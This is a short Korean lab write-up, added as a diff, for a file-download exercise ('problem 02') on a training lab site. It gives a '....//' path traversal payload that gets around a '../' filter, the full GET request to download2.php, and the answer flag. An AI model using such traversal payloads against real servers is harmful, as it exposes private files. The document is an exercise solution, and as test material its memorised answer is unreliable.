@@ -1,0 +1,19 @@
+==================================
+* 파일 다운로드 문제 02번
+==================================
+[풀이과정]
+
+1. 풀이과정
+1> 필터링 우회를 하기 위해 ..{../}/ 이렇게 넣어주었다.
+....//....//....//....//....//....//....//....//....//answer2/down.txt
+--> GET /exam27/down/download2.php?file_path=/lib/file/faq/....//....//....//....//....//....//....//answer2/down.txt
+
+2. 정답
+file_filter
+==================================
+
+https://lab.eqst.co.kr:8087/exam27/down/download2.php?file_path=/lib/file/faq/hap.png
+
+https://lab.eqst.co.kr:8088/exam28/down/download2.php?file_path=/lib/file/faq/owasp10.png
+
+/data/files/qna/a.txt
